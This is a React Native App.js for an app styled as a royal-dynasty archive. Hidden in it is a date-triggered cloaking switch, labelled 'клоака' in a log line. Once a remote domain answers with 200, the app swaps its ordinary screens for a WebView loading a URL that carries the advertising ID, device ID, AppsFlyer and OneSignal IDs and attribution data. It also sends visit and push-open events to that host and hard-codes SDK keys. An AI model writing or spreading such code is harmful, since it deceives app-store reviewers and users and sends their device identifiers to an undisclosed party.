import React, { JSX, useEffect, useState, useRef } from 'react';
import {
    Animated,StyleSheet, View,ActivityIndicator
} from 'react-native';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';
import {TouchableOpacity} from 'react-native';
import { useNavigation } from '@react-navigation/native';
import {Provider} from "react-redux";
import {PersistGate} from "redux-persist/integration/react";
import {persistor, store} from "./src/redux/store";
import TabNavigator from "./src/navigation/TabNavigator";
import DynastiesMoreScreen from "./src/screens/DynastiesMoreScreen";
import FavoritesScreen from "./src/screens/FavoritesScreen";
import CreateEventsScreen from "./src/screens/CreateEventsScreen";
import EventMoreScreen from "./src/screens/EventMoreScreen";
import PlaceMoreScreen from "./src/screens/PlaceMoreScreen";
import WichCrownFitsScreen from "./src/screens/WichCrownFitsScreen";
/////////////////////////////
import RoyalCrownArchiveProdScr from './src/screens/RoyalCrownArchiveProdScr';
import { WebView } from 'react-native-webview';
import ReactNativeIdfaAaid, {
    AdvertisingInfoResponse,
  } from '@sparkfabrik/react-native-idfa-aaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {LogLevel, OneSignal} from 'react-native-onesignal';
import appsFlyer from 'react-native-appsflyer';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import DeviceInfo from 'react-native-device-info';


const Stack = createStackNavigator();

const Left = () => {
    const navigation = useNavigation();
    return (
        <TouchableOpacity onPress={() => navigation.goBack()}>
        </TouchableOpacity>
    )
}

export default function App() {
    const [route, setRoute] = useState(false);
  //console.log('route===>', route);
  const [responseToPushPermition, setResponseToPushPermition] = useState(false);
  ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
  const [uniqVisit, setUniqVisit] = useState(true);
  //console.log('uniqVisit===>', uniqVisit);
  const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
  //console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
  //////////////////Parametrs
  const [idfa, setIdfa] = useState(false);
  //console.log('idfa==>', idfa);//
  const [oneSignalId, setOneSignalId] = useState(null);
  //console.log('oneSignalId==>', oneSignalId);
  const [appsUid, setAppsUid] = useState(null);
  const [sab1, setSab1] = useState();
  const [atribParam, setAtribParam] = useState(null);
  //const [pid, setPid] = useState();
  console.log('atribParam==>', atribParam);
  //console.log('sab1==>', sab1);
  //console.log('pid==>', pid);
  const [customerUserId, setCustomerUserId] = useState(null);
  //console.log('customerUserID==>', customerUserId);
  const [idfv, setIdfv] = useState();
  //console.log('idfv==>', idfv);
  /////////Atributions
  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
  //const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
  const [isDataReady, setIsDataReady] = useState(false);
  const [aceptTransperency, setAceptTransperency] = useState(false);
  const [completeLink, setCompleteLink] = useState(false);
  const [finalLink, setFinalLink] = useState('');
  //console.log('completeLink==>', completeLink);
  //console.log('finalLink==>', finalLink);
  const [isInstallConversionDone, setIsInstallConversionDone] = useState(false);
  const [pushOpenWebview, setPushOpenWebview] = useState(false);
  //console.log('pushOpenWebview==>', pushOpenWebview);
  const [timeStampUserId, setTimeStampUserId] = useState(false);
  console.log('timeStampUserId==>', timeStampUserId);
  const [checkApsData, setCheckApsData] = useState(null);
  const [checkAsaData, setCheckAsaData] = useState(null);
  
  const INITIAL_URL = `https://grand-venerable-championship.space/`;
  const URL_IDENTIFAIRE = `5dc0AhI9`;
  
  useEffect(() => {
    const fetchData = async () => {
      await Promise.all([checkUniqVisit(), getData()]); // Виконуються одночасно
      onInstallConversionDataCanceller(); // Виклик до зміни isDataReady
      setIsDataReady(true); // Встановлюємо, що дані готові
    };
  
    fetchData();
  }, []);
  
  useEffect(() => {
    const finalizeProcess = async () => {
      if (isDataReady && isInstallConversionDone) {
        await generateLink(); // Викликати generateLink, коли всі дані готові
        //console.log('Фінальна лінка сформована!');
      }
    };
  
    finalizeProcess();
  }, [isDataReady, isInstallConversionDone]);
  
  // uniq_visit
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
  
    // додати діставання таймштампу з асінк сторідж
  
    if (!uniqVisitStatus) {
      // Генеруємо унікальний ID користувача з timestamp
      /////////////Timestamp + user_id generation
      const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
      )}`;
      setTimeStampUserId(timestamp_user_id);
      //console.log('timeStampUserId==========+>', timeStampUserId);
  
      // Зберігаємо таймштамп у AsyncStorage
      await AsyncStorage.setItem('timeStampUserId', timestamp_user_id);
  
      await fetch(
        `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      OneSignal.User.addTag('timestamp_user_id', timestamp_user_id);
      //console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');
  
      // додати збереження таймштампу в асінк сторідж
    } else {
      if (storedTimeStampUserId) {
        setTimeStampUserId(storedTimeStampUserId);
        //console.log('Відновлений timeStampUserId:', storedTimeStampUserId);
      }
    }
  };
  
  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('App');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        //console.log('Дані дістаються в AsyncStorage');
        //console.log('parsedData in App==>', parsedData);
        //setAddPartToLinkOnce(parsedData.addPartToLinkOnce);
        setRoute(parsedData.route);
        setResponseToPushPermition(parsedData.responseToPushPermition);
        setUniqVisit(parsedData.uniqVisit);
        setOneSignalId(parsedData.oneSignalId);
        setIdfa(parsedData.idfa);
        setAppsUid(parsedData.appsUid);
        setSab1(parsedData.sab1);
        setAtribParam(parsedData.atribParam);
        //setPid(parsedData.pid);
        setCustomerUserId(parsedData.customerUserId);
        setIdfv(parsedData.idfv);
        setAdServicesAtribution(parsedData.adServicesAtribution);
        setAceptTransperency(parsedData.aceptTransperency);
        //setTimeStampUserId(parsedData.timeStampUserId);
        setCheckApsData(parsedData.checkApsData);
        setCheckAsaData(parsedData.checkAsaData);
        setCompleteLink(parsedData.completeLink);
        setFinalLink(parsedData.finalLink);
        //
        await performAppsFlyerOperationsContinuously();
      } else {
        // Якщо дані не знайдені в AsyncStorage
        const results = await Promise.all([
          fetchAdServicesAttributionData(),
          fetchIdfa(),
          requestOneSignallFoo(),
          performAppsFlyerOperations(),
          getUidApps(),
        ]);
  
        // Результати виконаних функцій
        //console.log('Результати функцій:', results);
  
        // Додаткові операції
        // onInstallConversionDataCanceller();
      }
    } catch (e) {
      //console.log('Помилка отримання даних в getData:', e);
    }
  };
  
  const setData = async () => {
    try {
      const data = {
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        atribParam,
        //pid,
        customerUserId,
        idfv,
        adServicesAtribution,
        aceptTransperency,
        finalLink,
        completeLink,
        //timeStampUserId,
        checkApsData,
        checkAsaData,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('App', jsonData);
      //console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      //console.log('Помилка збереження даних:', e);
    }
  };
  
  useEffect(() => {
    setData();
  }, [
    route,
    responseToPushPermition,
    uniqVisit,
    oneSignalId,
    idfa,
    appsUid,
    sab1,
    atribParam,
    //pid,
    customerUserId,
    idfv,
    adServicesAtribution,
    aceptTransperency,
    finalLink,
    completeLink,
    //timeStampUserId,
    checkApsData,
    checkAsaData,
  ]);
  
  const fetchAdServicesAttributionData = async () => {
    try {
      const adServicesAttributionData =
        await AppleAdsAttribution.getAdServicesAttributionData();
      //console.log('adservices' + adServicesAttributionData);
  
      // Извлечение значений из объекта
      ({ attribution } = adServicesAttributionData); // Присваиваем значение переменной attribution
      ({ keywordId } = adServicesAttributionData);
  
      setAdServicesAtribution(attribution);
      //setAdServicesKeywordId(keywordId);!sab1 ||
      //setSab1(attribution ? 'asa' : '');
      setAtribParam(attribution ? 'asa' : '');
      setCheckAsaData(JSON.stringify(adServicesAttributionData));
  
      // Вывод значений в консоль
      //Alert.alert(`sab1: ${sab1}`);
      //Alert.alert(`Attribution: ${attribution}`);
      //console.log(`Attribution: ${attribution}` + `KeywordId:${keywordId}`);
    } catch (error) {
      const { message } = error;
      //Alert.alert(message); // --> Some error message
    } finally {
      //console.log('Attribution');
    }
  };
  
  ///////// OneSignall
  const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          setResponseToPushPermition(res);
  
          const maxRetries = 5; // Кількість повторних спроб
          let attempts = 0;
  
          const fetchOneSignalId = () => {
            OneSignal.User.getOnesignalId()
              .then(deviceState => {
                if (deviceState) {
                  setOneSignalId(deviceState);
                  resolve(deviceState); // Розв'язуємо проміс, коли отримано ID
                } else if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000); // Повторна спроба через 1 секунду
                } else {
                  reject(new Error('Failed to retrieve OneSignal ID'));
                }
              })
              .catch(error => {
                if (attempts < maxRetries) {
                  attempts++;
                  setTimeout(fetchOneSignalId, 1000);
                } else {
                  console.error('Error fetching OneSignal ID:', error);
                  reject(error);
                }
              });
          };
  
          fetchOneSignalId(); // Викликаємо першу спробу отримання ID
        });
      } catch (error) {
        reject(error);
      }
    });
  };
  
  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };
  
  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
  
  // OneSignal ініціалізація
  OneSignal.initialize('f97aabf5-dffc-4eaf-9d17-999676b2cc78');
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);
  
  // Встановлюємо цей ID як OneSignal External ID
  useEffect(() => {
    if (timeStampUserId) {
      console.log(
        'OneSignal.login із таймштампом:',
        timeStampUserId,
        'полетів',
      );
      OneSignal.login(timeStampUserId);
    }
  }, [timeStampUserId]);
  
  // event push_open_browser & push_open_webview
  const pushOpenWebViewOnce = useRef(false); // Стан, щоб уникнути дублювання
  
  useEffect(() => {
    // Додаємо слухач подій
    const handleNotificationClick = async event => {
      if (pushOpenWebViewOnce.current) {
        // Уникаємо повторної відправки івента
        return;
      }
  
      let storedTimeStampUserId = await AsyncStorage.getItem('timeStampUserId');
      console.log('storedTimeStampUserId', storedTimeStampUserId);
  
      // Виконуємо fetch тільки коли timeStampUserId є
      if (event.notification.launchURL) {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        );
        console.log('Івент push_open_browser OneSignal');
        console.log(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_browser&jthrhg=${storedTimeStampUserId}`,
        );
      } else {
        setPushOpenWebview(true);
        fetch(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        );
        console.log('Івент push_open_webview OneSignal');
        console.log(
          `${INITIAL_URL}${URL_IDENTIFAIRE}?utretg=push_open_webview&jthrhg=${storedTimeStampUserId}`,
        );
      }
  
      pushOpenWebViewOnce.current = true; // Блокування повторного виконання
      setTimeout(() => {
        pushOpenWebViewOnce.current = false; // Зняття блокування через певний час
      }, 2500); // Затримка, щоб уникнути подвійного кліку
    };
  
    OneSignal.Notifications.addEventListener('click', handleNotificationClick);
    //Add Data Tags
    //OneSignal.User.addTag('timeStampUserId', timeStampUserId);
  
    return () => {
      // Видаляємо слухача подій при розмонтуванні
      OneSignal.Notifications.removeEventListener(
        'click',
        handleNotificationClick,
      );
    };
  }, []);
  
  // 1.1 FUNCTION - Повторна Ініціалізація AppsFlyer
  const performAppsFlyerOperationsContinuously = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'EsJBZj76R5fCiere38Z6Dd',
            appId: '6745225460',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });
  
      appsFlyer.startSdk();
      //console.log('StartAppsFly');
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };
  
  ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      console.log('АПС 1');
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'EsJBZj76R5fCiere38Z6Dd',
            appId: '6745225460',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          result => {
            console.log('📦 AppsFlyer initSdk callback result:', result);
            resolve(result);
          },
          error => {
            console.log('❌ AppsFlyer initSdk error:', error);
            reject(error);
          },
        );
      });
  
      appsFlyer.startSdk();
  
      //console.log('App.js AppsFlyer ініціалізовано успішно');
      //Alert.alert('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті
  
      appsFlyer.setCustomerUserId(uniqueId, res => {
        //console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };
  
  // 2ND FUNCTION - Ottrimannya UID AppsFlyer.
  const getUidApps = async () => {
    console.log('АПС 2');
    const maxRetries = 5; // Кількість спроб
    let attempts = 0;
  
    const fetchUid = async () => {
      try {
        const appsFlyerUID = await new Promise((resolve, reject) => {
          appsFlyer.getAppsFlyerUID((err, uid) => {
            if (err) {
              reject(err);
            } else {
              resolve(uid);
            }
          });
        });
  
        if (appsFlyerUID) {
          console.log('on getAppsFlyerUID: ' + appsFlyerUID);
          setAppsUid(appsFlyerUID);
        } else if (attempts < maxRetries) {
          attempts++;
          //console.warn(
          //  `AppsFlyerUID is null, retrying ${attempts}/${maxRetries}...`,
          //);
          setTimeout(fetchUid, 1000); // Повторна спроба через 1 сек.
        } else {
          //console.error('Failed to retrieve AppsFlyerUID after 5 attempts');
        }
      } catch (error) {
        if (attempts < maxRetries) {
          attempts++;
          //console.warn(
          //  `Error fetching AppsFlyerUID, retrying ${attempts}/${maxRetries}...`,
          //);
          setTimeout(fetchUid, 1000);
        } else {
          //console.error('Error fetching AppsFlyerUID:', error);
        }
      }
    };
  
    fetchUid(); // Викликаємо першу спробу отримання UID
  };
  
  // 3RD FUNCTION - Отримання неймінгу AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    async res => {
      // Додаємо async
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);
  
            const { campaign, pid, af_adset, af_ad, af_os } = res.data;
            setSab1(campaign);
            //setPid(pid);
            setCheckApsData(JSON.stringify(res.data));
          } else if (res.data.af_status === 'Organic') {
            //await fetchAdServicesAttributionData();
            //console.log('Organic');
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      } finally {
        // Змінюємо флаг на true після виконання
        setIsInstallConversionDone(true);
      }
    },
  );
  
  ///////// IDFA
  const fetchIdfa = async () => {
    try {
      //console.log('aceptTransperency', aceptTransperency);
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        setTimeout(() => {
          setAceptTransperency(true);
        }, 1500);
        //console.log('aceptTransperency', aceptTransperency);
        console.log('ЗГОДА!!!!!!!!!');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa('00000000-0000-0000-0000-000000000000'); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
        setTimeout(() => {
          setAceptTransperency(true);
        }, 2500);
        //console.log('aceptTransperency', aceptTransperency);
        console.log('НЕ ЗГОДА!!!!!!!!!');
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };
  
  ///////// Route useEff
  useEffect(() => {
    const checkUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    //console.log('checkUrl==========+>', checkUrl);
  
    const targetData = new Date('2025-07-14T08:08:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата
  
    if (!route) {
      console.log('!route');
      if (currentData <= targetData) {
        setRoute(false);
      } else {
        fetch(checkUrl, {
            method: 'GET',
            headers: {
              'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
            },
          })
          .then(r => {
            console.log('status по клоаке=++++++++++++=>', r.status);
            if (r.status === 200) {
              //console.log('status по клоаке=======>', r.status);
              setRoute(true);
            } else {
              setRoute(false);
            }
          })
          .catch(e => {
            //console.log('errar', e);
            setRoute(false);
          });
      }
    }
    return;
  }, []);
  
  ///////// Generate link
  const generateLink = async () => {
    try {
      console.log('Створення базової частини лінки');
      const baseUrl = [
        `${INITIAL_URL}${URL_IDENTIFAIRE}?${URL_IDENTIFAIRE}=1`,
        idfa && `idfa=${idfa}`,
        appsUid && `uid=${appsUid}`,
        customerUserId && `customerUserId=${customerUserId}`,
        idfv && `idfv=${idfv}`,
        oneSignalId && `oneSignalId=${oneSignalId}`,
        `jthrhg=${timeStampUserId}`,
      ]
        .filter(Boolean)
        .join('&');
  
      // Логіка обробки sab1
      let additionalParams = '';
      if (sab1) {
        if (sab1.includes('_')) {
          //console.log('Якщо sab1 містить "_", розбиваємо і формуємо subId');
          // Якщо sab1 містить "_", розбиваємо і формуємо subId
          let sabParts = sab1.split('_');
          additionalParams =
            sabParts
              .map((part, index) => `subId${index + 1}=${part}`)
              .join('&') + `&checkData=${checkApsData}`;
        } else {
          //console.log('Якщо sab1 не містить "_", встановлюємо subId1=sab1');
          //// Якщо sab1 не містить "_", встановлюємо subId1=sab1
          additionalParams = `checkData=${checkApsData}`;
        }
      } else {
        //console.log(
        //  'Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam',
        //);
        // Якщо sab1 undefined або пустий, встановлюємо subId1=atribParam
        additionalParams = `${atribParam ? `subId1=${atribParam}` : ''
          }&checkData=${checkAsaData}`;
      }
      //console.log('additionalParams====>', additionalParams);
      // Формування фінального лінку
      const product = `${baseUrl}&${additionalParams}${pushOpenWebview ? `&yhugh=${pushOpenWebview}` : ''
        }`;
      //(!addPartToLinkOnce ? `&yhugh=true` : ''); pushOpenWebview && '&yhugh=true'
      //console.log('Фінальна лінка сформована');
  
      // Зберігаємо лінк в стейт
      setFinalLink(product);
  
      // Встановлюємо completeLink у true
      setTimeout(() => {
        setCompleteLink(true);
      }, 2000);
    } catch (error) {
      console.error('Помилка при формуванні лінку:', error);
    }
  };
  console.log('My product Url ==>', finalLink);

    ///////// Route
    const Route = ({ isFatch }) => {
        if (!aceptTransperency || !completeLink) {
          // Показуємо тільки лоудери, поки acceptTransparency не true
          return null;
        }
      
        if (isFatch) {
            return (
                <Stack.Navigator>
                    <Stack.Screen
                        initialParams={{
                            responseToPushPermition,
                            product: finalLink,
                            timeStampUserId: timeStampUserId,
                        }}
                        name="RoyalCrownArchiveProdScr"
                        component={RoyalCrownArchiveProdScr}
                        options={{ headerShown: false }}
                    />
                </Stack.Navigator>
            );
        }
        return (
            <Stack.Navigator screenOptions={{
                headerLeft: Left, headerStyle: { backgroundColor: '#360013' },
                headerTitleStyle: {
                    color: 'white',
                    fontWeight: 'bold',
                    fontSize: 24,
                },
            }}>
                <Stack.Screen name="MainTab" component={TabNavigator} options={{ headerShown: false }} />
                <Stack.Screen name="DynastiesMoreScreen" component={DynastiesMoreScreen} options={{ headerShown: false }} />
                <Stack.Screen name="FavoritesScreen" component={FavoritesScreen} options={{ headerShown: false }} />
                <Stack.Screen name="CreateEventsScreen" component={CreateEventsScreen} options={{ headerShown: false }} />
                <Stack.Screen name="EventMoreScreen" component={EventMoreScreen} options={{ headerShown: false }} />
                <Stack.Screen name="PlaceMoreScreen" component={PlaceMoreScreen} options={{ headerShown: false }} />
                <Stack.Screen name="WichCrownFitsScreen" component={WichCrownFitsScreen} options={{ headerShown: false }} />
            </Stack.Navigator>
        );
    };

    ///////// Louder
    const [louderPrevIsEnded, setLouderPrevIsEnded] = useState(false);
  
    useEffect(() => {
        setTimeout(() => {
            setLouderPrevIsEnded(true);
        }, 8000);
    }, []);

    const loaderHTML = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0"/><style>body{background:#000;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.bars-loader{position:relative;display:block;width:150px;height:50px;text-align:center}.bar{position:relative;display:inline-block;margin:0 8px;width:10px;height:50px;border-radius:0px;background:#cdb682;box-shadow:0 4px 10px rgba(47,47,47,0.3);animation:swing 5s infinite cubic-bezier(0.955,-0.01,1,1);transform-origin:100% 100%}.bar::before{content:"";position:absolute;z-index:-1;bottom:0;display:block;width:10px;height:10px;background:transparent;box-shadow:0 4px rgba(29,29,29,0.3);animation:extend 5s infinite cubic-bezier(0.955,-0.01,1,1);opacity:0;transform-origin:0% 0%}.bar:nth-child(2),.bar:nth-child(2)::before{animation-delay:0.3s}.bar:nth-child(3),.bar:nth-child(3)::before{animation-delay:0.6s}.bar:nth-child(4),.bar:nth-child(4)::before{animation-delay:0.9s}.bar:nth-child(5),.bar:nth-child(5)::before{animation-delay:1.2s}.bar:last-of-type{animation-name:swing-last}.bar:last-of-type::before{animation-name:extend-last}@keyframes swing{10%{transform:rotate(70deg)}60%{transform:rotate(70deg)}70%{transform:rotate(0deg)}}@keyframes swing-last{10%{transform:rotate(90deg)}60%{transform:rotate(90deg)}70%{transform:rotate(0deg)}}@keyframes extend{10%{transform:rotate(-70deg);width:20px;opacity:1;left:0px;bottom:-1px}60%{transform:rotate(-70deg);width:20px;opacity:1}70%{width:10px;transform:rotate(0deg);opacity:0}}@keyframes extend-last{10%{transform:rotate(-90deg);width:20px;height:2px;opacity:0.5;left:3px;bottom:-1px}60%{transform:rotate(-90deg);width:20px;height:2px;opacity:0.5}70%{transform:rotate(0deg);width:10px;height:10px;opacity:0}}</style></head><body><div class="bars-loader"><span class="bar"></span><span class="bar"></span><span class="bar"></span><span class="bar"></span><span class="bar"></span></div></body></html>`;

        return (
            <Provider store={store}>
                <PersistGate loading={null} persistor={persistor}>
                    <NavigationContainer>
                    
                        {!louderPrevIsEnded || !aceptTransperency ? (
                            <WebView
                                originWhitelist={['*']}
                                source={{ html: loaderHTML }}
                            />
                        ) : (
                            <Route isFatch={route} />
                        )}
                    

                    </NavigationContainer>
                </PersistGate>
            </Provider>
        );
};
